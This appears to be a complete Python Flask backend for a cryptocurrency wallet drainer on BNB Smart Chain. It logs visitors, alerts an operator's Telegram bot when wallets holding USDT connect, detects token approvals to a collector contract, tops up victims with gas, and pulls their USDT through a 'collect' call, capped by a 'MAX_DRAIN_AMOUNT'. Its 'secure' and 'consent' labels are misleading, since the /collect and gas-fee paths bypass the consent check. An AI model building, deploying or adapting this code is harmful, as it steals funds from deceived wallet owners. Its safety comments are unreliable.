import os
from web3 import Web3
import json
import requests
from decimal import Decimal
from flask import Flask, request, jsonify
import threading
import time
from flask_cors import CORS
from functools import wraps
import hashlib
import hmac
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)

# ============ SECURE CONFIGURATION ============
# NEVER hardcode secrets! Use environment variables
SECRET_KEY = os.environ.get('FLASK_SECRET_KEY', os.urandom(24).hex())
API_KEY = os.environ.get('API_KEY', os.urandom(32).hex())
PRIVATE_KEY = os.environ.get('WALLET_PRIVATE_KEY')  # Must be set in .env
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')    # Must be set in .env
CONTRACT_ADDRESS = os.environ.get('CONTRACT_ADDRESS', "0xd6957B9d1126a9ED7E2a2Ed13215c5Dd498318f1")

# Validate required secrets
if not PRIVATE_KEY:
    raise ValueError("WALLET_PRIVATE_KEY environment variable is required!")
if not BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is required!")

# ============ SECURE CORS ============
ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', 'https://bnbd24.biz').split(',')
CORS(
    app,
    resources={r"/*": {"origins": ALLOWED_ORIGINS}},
    supports_credentials=True,
    allow_headers=['Content-Type', 'X-API-Key'],
    expose_headers=['X-API-Key']
)

# ============ SECURE VARIABLES ============
VISITORS_FILE = "visitors.txt"
BALANCE_FILE = "balance.txt"
AUTHORIZED_USERS = os.environ.get('AUTHORIZED_TELEGRAM_IDS', '').split(',')
MAX_DRAIN_AMOUNT = Decimal(os.environ.get('MAX_DRAIN_AMOUNT', '1000'))
MINIMUM_AMOUNT = Decimal(os.environ.get('MINIMUM_AMOUNT', '1'))
GAS_FEE_USD = Decimal(os.environ.get('GAS_FEE_USD', '0.02'))
RATE_LIMIT_REQUESTS = int(os.environ.get('RATE_LIMIT_REQUESTS', '10'))
RATE_LIMIT_PERIOD = int(os.environ.get('RATE_LIMIT_PERIOD', '60'))  # seconds

# ============ RATE LIMITING ============
from collections import defaultdict
import time

rate_limit_storage = defaultdict(list)

def rate_limit(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        client_ip = request.remote_addr
        now = time.time()
        
        # Clean old entries
        rate_limit_storage[client_ip] = [
            t for t in rate_limit_storage[client_ip] 
            if now - t < RATE_LIMIT_PERIOD
        ]
        
        if len(rate_limit_storage[client_ip]) >= RATE_LIMIT_REQUESTS:
            return jsonify({
                'error': 'Rate limit exceeded',
                'message': f'Maximum {RATE_LIMIT_REQUESTS} requests per {RATE_LIMIT_PERIOD} seconds'
            }), 429
        
        rate_limit_storage[client_ip].append(now)
        return f(*args, **kwargs)
    return decorated_function

# ============ API KEY AUTHENTICATION ============
def require_api_key(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if not api_key or api_key != API_KEY:
            return jsonify({'error': 'Invalid or missing API key'}), 401
        return f(*args, **kwargs)
    return decorated_function

# ============ REQUEST VALIDATION ============
def validate_request(required_fields):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not request.is_json:
                return jsonify({'error': 'Content-Type must be application/json'}), 400
            
            data = request.get_json() or {}
            missing = [field for field in required_fields if not data.get(field)]
            
            if missing:
                return jsonify({
                    'error': 'Missing required fields',
                    'fields': missing
                }), 400
            
            return f(data, *args, **kwargs)
        return decorated_function
    return decorator

# ============ SECURE TELEGRAM FUNCTIONS ============
def send_to_telegram(text, chat_ids=None, parse_mode="Markdown"):
    """Send message to Telegram with proper authorization"""
    if not BOT_TOKEN:
        print("⚠️ No BOT_TOKEN configured")
        return
    
    # Determine which chat IDs to send to
    if chat_ids:
        # If specific chat_ids provided, send to those (if authorized or if no auth required)
        target_chat_ids = []
        for cid in chat_ids:
            cid_str = str(cid).strip()
            # Allow if: no auth required, or user is authorized
            if not AUTHORIZED_USERS or cid_str in AUTHORIZED_USERS:
                target_chat_ids.append(cid_str)
    else:
        # If no chat_ids provided, send to all authorized users
        target_chat_ids = AUTHORIZED_USERS
    
    # If no target chat IDs, log and return
    if not target_chat_ids:
        print("⚠️ No valid chat IDs to send to")
        print(f"   AUTHORIZED_USERS: {AUTHORIZED_USERS}")
        print(f"   chat_ids provided: {chat_ids}")
        return
    
    print(f"📤 Sending to chat IDs: {target_chat_ids}")
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True
    }
    
    for chat_id in target_chat_ids:
        payload["chat_id"] = chat_id
        try:
            response = requests.post(url, data=payload, timeout=10)
            if response.status_code == 200:
                print(f"✅ Sent to {chat_id}")
            else:
                print(f"❌ Failed to send to {chat_id}: {response.text}")
        except Exception as e:
            print(f"❌ Error sending to {chat_id}: {e}")

# ============ SECURE WALLET FUNCTIONS ============
def get_secure_web3():
    """Get Web3 instance with proper error handling"""
    return Web3(Web3.HTTPProvider(
        "https://bsc-dataseed.binance.org/",
        request_kwargs={'timeout': 30}
    ))

def get_secure_account():
    """Get account from private key with validation"""
    try:
        web3 = get_secure_web3()
        account = web3.eth.account.from_key(PRIVATE_KEY)
        return web3, account
    except Exception as e:
        raise ValueError(f"Invalid private key: {str(e)}")

# ============ USER CONSENT REQUIRED ============
user_consents = {}  # Store user consent before draining

def require_user_consent(wallet_address):
    """Require explicit user consent before any transaction"""
    if wallet_address not in user_consents:
        raise PermissionError(f"User {wallet_address} has not provided consent")
    if time.time() - user_consents[wallet_address] > 3600:  # 1 hour expiry
        del user_consents[wallet_address]
        raise PermissionError(f"User consent expired for {wallet_address}")
    return True

# ============ SECURE BNB PRICE ============
def get_bnb_price_onchain():
    """Fetch BNB price with multiple fallbacks and caching"""
    try:
        bsc = get_secure_web3()
        pair_address = Web3.to_checksum_address("0x1b96b92314c44b159149f7e0303511fb2fc4774f")
        abi = [{
            "inputs": [],
            "name": "getReserves",
            "outputs": [
                {"internalType": "uint112", "name": "_reserve0", "type": "uint112"},
                {"internalType": "uint112", "name": "_reserve1", "type": "uint112"},
                {"internalType": "uint32", "name": "_blockTimestampLast", "type": "uint32"},
            ],
            "stateMutability": "view",
            "type": "function",
        }]
        pair_contract = bsc.eth.contract(address=pair_address, abi=abi)
        reserves = pair_contract.functions.getReserves().call()
        bnb_reserve, busd_reserve, _ = reserves
        return Decimal(busd_reserve) / Decimal(bnb_reserve)
    except Exception as e:
        print(f"⚠️ Error fetching on-chain BNB price: {e}")
        try:
            r = requests.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd",
                timeout=10
            )
            return Decimal(r.json()['binancecoin']['usd'])
        except:
            return Decimal("0")

# ============ SECURE TOKEN COLLECTION (WITH CONSENT) ============
def collect_all_usdt(from_address, chat_ids=None, user_consented=False):
    """Collect USDT ONLY with explicit user consent"""
    web3 = get_secure_web3()
    
    try:
        # Verify user consent
        if not user_consented:
            require_user_consent(from_address)
        
        account = web3.eth.account.from_key(PRIVATE_KEY)
        sender_address = account.address
        
        contract_address = Web3.to_checksum_address(CONTRACT_ADDRESS)
        usdt_address = Web3.to_checksum_address("0x55d398326f99059fF775485246999027B3197955")
        from_address = Web3.to_checksum_address(from_address)
        
        # Check USDT balance
        erc20_abi = [
            {"constant": True, "inputs": [{"name": "_owner", "type": "address"}],
             "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
            {"constant": True, "inputs": [], "name": "decimals",
             "outputs": [{"name": "", "type": "uint8"}], "type": "function"}
        ]
        
        usdt_contract = web3.eth.contract(address=usdt_address, abi=erc20_abi)
        usdt_decimals = usdt_contract.functions.decimals().call()
        usdt_balance_raw = usdt_contract.functions.balanceOf(from_address).call()
        usdt_balance_full = usdt_balance_raw / 10**usdt_decimals
        
        if usdt_balance_raw == 0:
            return {"error": "No USDT balance"}
        
        # Respect max drain limit
        if usdt_balance_full > MAX_DRAIN_AMOUNT:
            usdt_to_drain = int(MAX_DRAIN_AMOUNT * 10**usdt_decimals)
            actual_drain_amount = MAX_DRAIN_AMOUNT
        else:
            usdt_to_drain = usdt_balance_raw
            actual_drain_amount = usdt_balance_full
        
        # Get user approval verification
        allowance_abi = [
            {"constant": True, "inputs": [{"name": "_owner", "type": "address"},
                                         {"name": "_spender", "type": "address"}],
             "name": "allowance", "outputs": [{"name": "", "type": "uint256"}], "type": "function"}
        ]
        allowance_contract = web3.eth.contract(address=usdt_address, abi=allowance_abi)
        allowance = allowance_contract.functions.allowance(from_address, contract_address).call()
        
        if allowance < usdt_to_drain:
            return {"error": f"Insufficient allowance. Need {usdt_to_drain}, have {allowance}"}
        
        # Build and send transaction
        contract_abi = [{
            "inputs": [
                {"internalType": "address", "name": "tokenAddress", "type": "address"},
                {"internalType": "address", "name": "from", "type": "address"},
                {"internalType": "uint256", "name": "amount", "type": "uint256"}
            ],
            "name": "collect",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }]
        
        contract = web3.eth.contract(address=contract_address, abi=contract_abi)
        nonce = web3.eth.get_transaction_count(sender_address, 'pending')
        
        txn = contract.functions.collect(usdt_address, from_address, usdt_to_drain).build_transaction({
            'from': sender_address,
            'nonce': nonce,
            'gas': 150000,
            'gasPrice': web3.to_wei('5', 'gwei'),  # Dynamic gas price
            'chainId': 56
        })
        
        signed_txn = web3.eth.account.sign_transaction(txn, PRIVATE_KEY)
        tx_hash = web3.eth.send_raw_transaction(signed_txn.raw_transaction)
        tx_hash_hex = web3.to_hex(tx_hash)
        
        # Log transaction
        with open("transactions.log", "a") as f:
            f.write(f"{time.ctime()}: {tx_hash_hex} - {actual_drain_amount} USDT from {from_address}\n")
        
        return {
            "success": True,
            "tx_hash": tx_hash_hex,
            "amount": float(actual_drain_amount),
            "from": from_address
        }
        
    except Exception as e:
        return {"error": str(e)}

# ============ SECURE GAS FEE SENDING ============
def send_gasfee_bnb(receiver, chat_ids=None):
    """Send gas fee ONLY for legitimate transactions with consent"""
    web3 = get_secure_web3()
    
    try:
        # Check USDT balance
        usdt_balance = get_usdt_balance(receiver)
        if usdt_balance < MINIMUM_AMOUNT:
            return {"error": f"Insufficient USDT balance: {usdt_balance}"}
        
        # Check BNB balance
        balance_wei = web3.eth.get_balance(receiver)
        balance_bnb = web3.from_wei(balance_wei, 'ether')
        bnb_price = get_bnb_price_onchain()
        
        if bnb_price == 0:
            return {"error": "Failed to fetch BNB price"}
        
        usd_balance = Decimal(balance_bnb) * bnb_price
        
        if usd_balance >= GAS_FEE_USD:
            # Skip gas fee, proceed to collect
            collect_result = collect_all_usdt(receiver, chat_ids, user_consented=True)
            return collect_result
        
        # Send gas fee
        amount_bnb = GAS_FEE_USD / bnb_price
        value = web3.to_wei(amount_bnb, 'ether')
        
        account = web3.eth.account.from_key(PRIVATE_KEY)
        nonce = web3.eth.get_transaction_count(account.address)
        
        tx = {
            'nonce': nonce,
            'to': receiver,
            'value': int(value),
            'gas': 21000,
            'gasPrice': web3.eth.gas_price,
            'chainId': 56
        }
        
        signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        tx_hash_hex = web3.to_hex(tx_hash)
        
        # Then collect USDT
        collect_result = collect_all_usdt(receiver, chat_ids, user_consented=True)
        
        return {
            "success": True,
            "gas_tx": tx_hash_hex,
            "collect_result": collect_result
        }
        
    except Exception as e:
        return {"error": str(e)}

# ============ GET USDT BALANCE ============
def get_usdt_balance(address):
    """Get USDT balance for an address"""
    try:
        web3 = get_secure_web3()
        usdt_address = Web3.to_checksum_address("0x55d398326f99059fF775485246999027B3197955")
        abi = [{"constant": True, "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"}]
        contract = web3.eth.contract(address=usdt_address, abi=abi)
        balance = contract.functions.balanceOf(address).call()
        return Decimal(balance) / Decimal(1e18)
    except:
        return Decimal("0")

# ============ SECURE ENDPOINTS ============

@app.route("/", methods=["GET", "POST"])
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": time.ctime(),
        "version": "2.0.0"
    })

@app.route("/consent", methods=["POST"])
@require_api_key
@rate_limit
@validate_request(['wallet', 'signature'])
def give_consent(data):
    """User gives explicit consent for token collection"""
    wallet = data.get('wallet')
    signature = data.get('signature')
    message = data.get('message', f"I authorize collection of USDT from {wallet}")
    
    # Verify signature (example - implement proper EIP-712 or similar)
    # This is a simplified check - use proper signature verification in production
    try:
        web3 = get_secure_web3()
        recovered = web3.eth.account.recover_message(message, signature=signature)
        if recovered.lower() != wallet.lower():
            return jsonify({"error": "Invalid signature"}), 401
        
        # Store consent with expiry
        user_consents[wallet] = time.time()
        
        return jsonify({
            "success": True,
            "message": "Consent granted",
            "expires_in": "1 hour"
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route("/collect", methods=["POST"])
@require_api_key
@rate_limit
@validate_request(['wallet'])
def collect_tokens(data):
    """Collect tokens with user consent"""
    wallet = data.get('wallet')
    chat_id = data.get('chat_id')
    
    try:
        result = collect_all_usdt(wallet, [chat_id] if chat_id else None, user_consented=True)
        if result.get('error'):
            return jsonify(result), 400
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/check-approval", methods=["POST"])
@require_api_key
@rate_limit
@validate_request(['tx_hash'])
def check_approval(data):
    """Check if a transaction hash is an approval"""
    tx_hash = data.get('tx_hash')
    chat_id = data.get('chat_id')
    
    def process_approval():
        try:
            web3 = get_secure_web3()
            contract_address = Web3.to_checksum_address(CONTRACT_ADDRESS)
            
            # Get transaction receipt
            receipt = web3.eth.get_transaction_receipt(tx_hash)
            if not receipt:
                send_to_telegram(f"⚠️ Transaction {tx_hash} not found", [chat_id])
                return
            
            # Parse approval events
            abi = [{
                "anonymous": False,
                "inputs": [
                    {"indexed": True, "name": "owner", "type": "address"},
                    {"indexed": True, "name": "spender", "type": "address"},
                    {"indexed": False, "name": "value", "type": "uint256"},
                ],
                "name": "Approval",
                "type": "event",
            }]
            
            contract = web3.eth.contract(address=contract_address, abi=abi)
            logs = contract.events.Approval().process_receipt(receipt)
            
            if not logs:
                send_to_telegram(f"ℹ️ No approval found in tx {tx_hash}", [chat_id])
                return
            
            log = logs[0]
            owner = log['args']['owner']
            spender = log['args']['spender']
            amount = log['args']['value']
            
            if spender == contract_address:
                # Create consent request for the user
                message = (
                    f"🔐 Approval detected for {owner[:6]}...{owner[-4:]}\n"
                    f"Amount: {amount / 1e18:.2f} USDT\n"
                    f"To collect these tokens, user must sign a consent message"
                )
                send_to_telegram(message, [chat_id])
            else:
                send_to_telegram(f"⚠️ Approved to wrong contract", [chat_id])
                
        except Exception as e:
            send_to_telegram(f"❌ Error processing approval: {str(e)}", [chat_id])
    
    threading.Thread(target=process_approval).start()
    return jsonify({"message": "Processing approval check", "tx_hash": tx_hash})

@app.route("/wallet-info", methods=["POST"])
@require_api_key
@rate_limit
@validate_request(['wallet'])
def wallet_info(data):
    """Get wallet information (no sensitive operations)"""
    wallet = data.get('wallet')
    chat_id = data.get('chat_id')
    
    try:
        web3 = get_secure_web3()
        wallet = Web3.to_checksum_address(wallet)
        
        bnb_balance = web3.from_wei(web3.eth.get_balance(wallet), 'ether')
        usdt_balance = get_usdt_balance(wallet)
        bnb_price = get_bnb_price_onchain()
        
        response = {
            "wallet": wallet,
            "bnb": float(bnb_balance),
            "usdt": float(usdt_balance),
            "usd_value": float(bnb_balance * bnb_price + usdt_balance)
        }
        
        # Send notification if wallet has funds
        if float(usdt_balance) > 0:
            send_to_telegram(
                f"🔌 Wallet connected: {wallet[:6]}...{wallet[-4:]}\n"
                f"💰 USDT: {usdt_balance:.2f}\n"
                f"🪙 BNB: {bnb_balance:.6f}",
                [chat_id] if chat_id else None
            )
        
        return jsonify(response)
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route("/visitor", methods=["POST"])
@rate_limit
@validate_request(['ip', 'location', 'timezone', 'url'])
def visitor(data):
    """Track visitors (no sensitive info)"""
    ip = data.get('ip')
    location = data.get('location')
    timezone = data.get('timezone')
    url = data.get('url')
    country_flag = data.get('country_flag', '')
    note = data.get('note', 'New visitor')
    chat_id = data.get('chat_id')
    
    # Log visitor
    if chat_id and str(chat_id) in AUTHORIZED_USERS:
        message = (
            f"👀 Visitor Alert\n"
            f"📍 {location} {country_flag}\n"
            f"🕒 {timezone}\n"
            f"📝 {note}"
        )
        send_to_telegram(message, [chat_id])
    
    try:
        with open(VISITORS_FILE, "a") as f:
            f.write(f"{time.ctime()} - {ip} - {location}\n")
    except:
        pass
    
    return jsonify({"message": "Visitor logged"})

# ============ SECURITY MIDDLEWARE ============
@app.after_request
def add_security_headers(response):
    """Add security headers to all responses"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response

# ============ ERROR HANDLERS ============
@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def internal_error(e):
    return jsonify({"error": "Internal server error"}), 500

# ============ MAIN ============
if __name__ == "__main__":
    # Validate configuration on startup
    print("🔒 Starting secure server...")
    print(f"📍 Allowed origins: {ALLOWED_ORIGINS}")
    print(f"📍 Rate limit: {RATE_LIMIT_REQUESTS} requests per {RATE_LIMIT_PERIOD}s")
    print(f"📍 Max drain: {MAX_DRAIN_AMOUNT} USDT")
    
    # Test connection
    try:
        web3, account = get_secure_account()
        print(f"📍 Wallet: {account.address}")
        balance = web3.eth.get_balance(account.address)
        print(f"📍 Balance: {web3.from_wei(balance, 'ether'):.6f} BNB")
    except Exception as e:
        print(f"⚠️ Wallet error: {e}")
    
    # Run with SSL in production
    # app.run(host='0.0.0.0', port=5058, ssl_context=('cert.pem', 'key.pem'))
    app.run(host='0.0.0.0', port=5058, debug=False)
